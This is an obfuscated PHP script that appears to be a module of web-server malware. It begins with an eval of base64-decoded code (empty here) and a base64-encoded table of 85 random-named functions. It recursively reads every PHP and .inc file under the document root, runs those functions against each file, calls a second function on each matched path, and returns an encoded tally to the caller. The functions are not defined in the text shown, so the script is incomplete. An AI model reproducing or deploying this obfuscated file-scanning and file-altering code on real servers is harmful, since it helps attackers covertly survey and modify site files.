eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo4NTp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czoxMToicmVzZ2FtbGVvd3ciO2k6MjtzOjk6ImdqeXViZnVvZyI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6NToicmlod3MiO2k6MjtzOjExOiJnaWxvend5dXJ4dSI7fWk6MjthOjM6e2k6MDtpOjE1O2k6MTtzOjc6InJ6aHBvb2kiO2k6MjtzOjk6ImdydXlvb3JudSI7fWk6MzthOjM6e2k6MDtpOjE4O2k6MTtzOjg6InJ2dmhzY2xvIjtpOjI7czo4OiJna3V0dG5nbCI7fWk6NDthOjM6e2k6MDtpOjIzO2k6MTtzOjEwOiJyYW5ybWxmcW5pIjtpOjI7czo1OiJnc2xxZiI7fWk6NTthOjM6e2k6MDtpOjM2O2k6MTtzOjg6InJpY3Zmdm5qIjtpOjI7czo5OiJnZnN1dHVvZHkiO31pOjY7YTozOntpOjA7aTo0MjtpOjE7czoxMToicnlsYWp5d2JpcW0iO2k6MjtzOjk6ImdqbWxpdmdmcyI7fWk6NzthOjM6e2k6MDtpOjU0O2k6MTtzOjg6InJlcmRqamhuIjtpOjI7czoxMDoiZ3ZqcGdyaHVodCI7fWk6ODthOjM6e2k6MDtpOjYwO2k6MTtzOjExOiJyc2hqY2J0cGxkayI7aToyO3M6NDoiZ2ZrdCI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjk6InJ4d3R6amp6cSI7aToyO3M6OToiZ2VqaWV5cHVxIjt9aToxMDthOjM6e2k6MDtpOjEwOTtpOjE7czoxMDoicmd0d2N3bnR4ZSI7aToyO3M6NzoiZ25veWJ5eSI7fWk6MTE7YTozOntpOjA7aToxMTA7aToxO3M6ODoicmlmb3lpYWUiO2k6MjtzOjc6Imd3b2xocmgiO31pOjEyO2E6Mzp7aTowO2k6MTExO2k6MTtzOjQ6InJmcGwiO2k6MjtzOjc6ImdvcnVibWMiO31pOjEzO2E6Mzp7aTowO2k6MTEyO2k6MTtzOjk6InJwanBtbG91cCI7aToyO3M6NzoiZ2hrbWJlYiI7fWk6MTQ7YTozOntpOjA7aToxMTU7aToxO3M6MTE6InJ5aHZ4Y295amJ4IjtpOjI7czo5OiJnemRyeHB1ZHEiO31pOjE1O2E6Mzp7aTowO2k6MTE4O2k6MTtzOjg6InJ2a2J6b21yIjtpOjI7czo1OiJnbHVyZiI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6MTA6InJremRmbmV2emYiO2k6MjtzOjEwOiJnanBzZ3hpcndlIjt9aToxNzthOjM6e2k6MDtpOjEyNztpOjE7czo3OiJydmJrendvIjtpOjI7czoxMToiZ21hd2RhcmJ3ZHoiO31pOjE4O2E6Mzp7aTowO2k6MTMwO2k6MTtzOjQ6InJwY2wiO2k6MjtzOjc6ImdiamtydGUiO31pOjE5O2E6Mzp7aTowO2k6MTM0O2k6MTtzOjU6InJnYXBiIjtpOjI7czo1OiJnbmNmaSI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6NToicmNiZGEiO2k6MjtzOjU6Imd5YXF5Ijt9aToyMTthOjM6e2k6MDtpOjE0ODtpOjE7czo5OiJyZ2htb2Rsd3giO2k6MjtzOjY6Imd6d2RvZiI7fWk6MjI7YTozOntpOjA7aToxNTc7aToxO3M6OToicnF4aXRndHB1IjtpOjI7czo5OiJnb3ppdHZxc2UiO31pOjIzO2E6Mzp7aTowO2k6MTYzO2k6MTtzOjQ6InJ5ZmQiO2k6MjtzOjU6ImdlcGNzIjt9aToyNDthOjM6e2k6MDtpOjE3MjtpOjE7czo5OiJyd2thZWhvaXEiO2k6MjtzOjc6ImdzeW90cnUiO31pOjI1O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjEwOiJyd2Via2RjeW5lIjtpOjI7czo5OiJnaHFqbWlzdHciO31pOjI2O2E6Mzp7aTowO2k6MTc5O2k6MTtzOjU6InJmem1wIjtpOjI7czoxMToiZ3hoYWhocGZwaGgiO31pOjI3O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjU6InJvb2xsIjtpOjI7czo3OiJndGd6bHhkIjt9aToyODthOjM6e2k6MDtpOjE4OTtpOjE7czo1OiJybndweiI7aToyO3M6NzoiZ3FhYmtuZSI7fWk6Mjk7YTozOntpOjA7aToxOTI7aToxO3M6ODoicnNkeGh6Y3kiO2k6MjtzOjg6Imd3bWJjYWFtIjt9aTozMDthOjM6e2k6MDtpOjE5NjtpOjE7czoxMToicmVza3lzbHJjZ2ciO2k6MjtzOjU6Imd6cm9rIjt9aTozMTthOjM6e2k6MDtpOjE5ODtpOjE7czo3OiJydndvbG9rIjtpOjI7czo2OiJnZWVremsiO31pOjMyO2E6Mzp7aTowO2k6MTk5O2k6MTtzOjU6InJmZ3FnIjtpOjI7czo5OiJnbXBxd3locnkiO31pOjMzO2E6Mzp7aTowO2k6MjAwO2k6MTtzOjEwOiJyZXZna2JvZnNmIjtpOjI7czo4OiJndG5nZGdxbCI7fWk6MzQ7YTozOntpOjA7aToyMDE7aToxO3M6OToicmJmbW1pemh0IjtpOjI7czo4OiJncGlnZ3NneiI7fWk6MzU7YTozOntpOjA7aToyMDM7aToxO3M6NDoicmhxayI7aToyO3M6NToiZ2ptcG4iO31pOjM2O2E6Mzp7aTowO2k6MjA2O2k6MTtzOjY6InJ4bnZwYiI7aToyO3M6NDoiZ2xubSI7fWk6Mzc7YTozOntpOjA7aToyMDk7aToxO3M6OToicmJ2Z2NhYnJ1IjtpOjI7czo4OiJnbnFhcXRzaSI7fWk6Mzg7YTozOntpOjA7aToyMTA7aToxO3M6NToicm10dnQiO2k6MjtzOjU6ImdrY2ZoIjt9aTozOTthOjM6e2k6MDtpOjIxMjtpOjE7czo3OiJyaG5nZXV6IjtpOjI7czo0OiJnaWl3Ijt9aTo0MDthOjM6e2k6MDtpOjIxMztpOjE7czo0OiJyZm1qIjtpOjI7czo2OiJnaXZnbmwiO31pOjQxO2E6Mzp7aTowO2k6MjE0O2k6MTtzOjY6InJlYnlqcyI7aToyO3M6NjoiZ2RzZHpnIjt9aTo0MjthOjM6e2k6MDtpOjIxNTtpOjE7czo3OiJybm5udW5zIjtpOjI7czo1OiJnc3JzaSI7fWk6NDM7YTozOntpOjA7aToyMTY7aToxO3M6NzoicnRmd29sbiI7aToyO3M6MTA6ImdpemVlaXRob3oiO31pOjQ0O2E6Mzp7aTowO2k6MjE3O2k6MTtzOjY6InJ4bHpwdSI7aToyO3M6MTE6ImdhbGdrYXVqd3dkIjt9aTo0NTthOjM6e2k6MDtpOjIxODtpOjE7czo4OiJydGRqcXNvYSI7aToyO3M6NzoiZ3ZoeW5sdCI7fWk6NDY7YTozOntpOjA7aToyMjE7aToxO3M6MTE6InJ5dXN5ZGNkaGV0IjtpOjI7czo3OiJnc2hhbXVmIjt9aTo0NzthOjM6e2k6MDtpOjIyMjtpOjE7czoxMToicnB2Z2pscHd5aXIiO2k6MjtzOjQ6ImdiYWwiO31pOjQ4O2E6Mzp7aTowO2k6MjIzO2k6MTtzOjU6InJiZmhxIjtpOjI7czo0OiJnZW1wIjt9aTo0OTthOjM6e2k6MDtpOjIyNDtpOjE7czoxMToicmpyZndmemZraGYiO2k6MjtzOjU6ImdzeWRwIjt9aTo1MDthOjM6e2k6MDtpOjIyNTtpOjE7czo5OiJycXRibGhjdWsiO2k6MjtzOjc6ImdsaHlyYWYiO31pOjUxO2E6Mzp7aTowO2k6MjMwO2k6MTtzOjk6InJ1Z3d4Y2hlayI7aToyO3M6ODoiZ2x3d3VreHoiO31pOjUyO2E6Mzp7aTowO2k6MjMyO2k6MTtzOjU6InJ5ZGhkIjtpOjI7czo2OiJnendoamsiO31pOjUzO2E6Mzp7aTowO2k6MjM1O2k6MTtzOjY6InJwY3RuZSI7aToyO3M6NjoiZ3h0dHpmIjt9aTo1NDthOjM6e2k6MDtpOjIzNjtpOjE7czo2OiJyc3F1d2wiO2k6MjtzOjU6ImdvbHVuIjt9aTo1NTthOjM6e2k6MDtpOjIzNztpOjE7czo1OiJyZWh2aCI7aToyO3M6NzoiZ29wY3ZpeSI7fWk6NTY7YTozOntpOjA7aToyMzg7aToxO3M6ODoicnBvcnNhaWciO2k6MjtzOjExOiJnaG1uYmdxZmd1ZyI7fWk6NTc7YTozOntpOjA7aToyMzk7aToxO3M6MTA6InJ0ZXh2dGllc2EiO2k6MjtzOjk6ImdpZ2dlaGRleiI7fWk6NTg7YTozOntpOjA7aToyNDA7aToxO3M6MTA6InJweGZlcXhlaWYiO2k6MjtzOjU6ImdnZGRzIjt9aTo1OTthOjM6e2k6MDtpOjI0MTtpOjE7czoxMDoicnFkcm1nYXZteCI7aToyO3M6MTA6Imd2bmpwcmh1eWoiO31pOjYwO2E6Mzp7aTowO2k6MjQyO2k6MTtzOjU6InJ3d3N5IjtpOjI7czo1OiJnZGp3ayI7fWk6NjE7YTozOntpOjA7aToyNDM7aToxO3M6NjoicmRrZ2tvIjtpOjI7czo1OiJnYnJleSI7fWk6NjI7YTozOntpOjA7aToyNDQ7aToxO3M6Nzoicmx3cHhyayI7aToyO3M6OToiZ2xudXpsd3BiIjt9aTo2MzthOjM6e2k6MDtpOjI0NTtpOjE7czo2OiJyaWd5b2YiO2k6MjtzOjk6ImdibXJzbnpncSI7fWk6NjQ7YTozOntpOjA7aToyNDY7aToxO3M6NDoicmNldSI7aToyO3M6MTE6ImdsZm9obGJmb2VhIjt9aTo2NTthOjM6e2k6MDtpOjI0NztpOjE7czoxMToicmFpaGJ4d3R6d28iO2k6MjtzOjU6ImdtamdjIjt9aTo2NjthOjM6e2k6MDtpOjI0ODtpOjE7czo5OiJyeGFiaWFnbmwiO2k6MjtzOjU6Imdqbm91Ijt9aTo2NzthOjM6e2k6MDtpOjI0OTtpOjE7czo0OiJydnZnIjtpOjI7czo5OiJnbWljamF1am0iO31pOjY4O2E6Mzp7aTowO2k6MjUwO2k6MTtzOjEwOiJyYmxzb2lkeGJrIjtpOjI7czoxMToiZ3BlbXl6dXd2eGEiO31pOjY5O2E6Mzp7aTowO2k6MjUxO2k6MTtzOjY6InJram5jayI7aToyO3M6NToiZ3ZzenAiO31pOjcwO2E6Mzp7aTowO2k6MjUyO2k6MTtzOjk6InJvcXVnbXFsbCI7aToyO3M6NDoiZ2J2eCI7fWk6NzE7YTozOntpOjA7aToyNTM7aToxO3M6ODoicmZ1YXplZmQiO2k6MjtzOjg6Imd4bGxzd3FjIjt9aTo3MjthOjM6e2k6MDtpOjI1NDtpOjE7czo0OiJyb3pxIjtpOjI7czo3OiJndW9zenR4Ijt9aTo3MzthOjM6e2k6MDtpOjI1NTtpOjE7czo1OiJyc3B0cyI7aToyO3M6NjoiZ2V3YXBoIjt9aTo3NDthOjM6e2k6MDtpOjI1NjtpOjE7czoxMToicmVvYnFhd3dsa2giO2k6MjtzOjY6ImdydXJ5eiI7fWk6NzU7YTozOntpOjA7aToyNTc7aToxO3M6MTA6InJ1Y3lxb2pwY3AiO2k6MjtzOjEwOiJnb2h3eHN0cmNhIjt9aTo3NjthOjM6e2k6MDtpOjI1ODtpOjE7czo0OiJybmh1IjtpOjI7czo2OiJnaWNybW4iO31pOjc3O2E6Mzp7aTowO2k6MjU5O2k6MTtzOjg6InJ1c3hhdXR6IjtpOjI7czoxMDoiZ2N2eGJwcm9saSI7fWk6Nzg7YTozOntpOjA7aToyNjA7aToxO3M6ODoicmZ0aHRtcWciO2k6MjtzOjY6Imdxd2N5aSI7fWk6Nzk7YTozOntpOjA7aToyNjE7aToxO3M6NzoicmR5amJvaSI7aToyO3M6MTE6ImdjZXlqenBmaWVyIjt9aTo4MDthOjM6e2k6MDtpOjI2MjtpOjE7czoxMToicml4dWZteXJ6bnciO2k6MjtzOjEwOiJnZ290b2p0eHd3Ijt9aTo4MTthOjM6e2k6MDtpOjI2MztpOjE7czo3OiJyd253dm9zIjtpOjI7czo4OiJncnpzbWhjYiI7fWk6ODI7YTozOntpOjA7aToyNjQ7aToxO3M6MTA6InJwY3VvZHJ4eXciO2k6MjtzOjExOiJnb2NsaHFheWRvbyI7fWk6ODM7YTozOntpOjA7aToyNjU7aToxO3M6NjoicmFqYnJtIjtpOjI7czo4OiJnd3lsbHRvZSI7fWk6ODQ7YTozOntpOjA7aToyNjY7aToxO3M6NToicmFud3IiO2k6MjtzOjY6ImdpcmppYiI7fX0="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();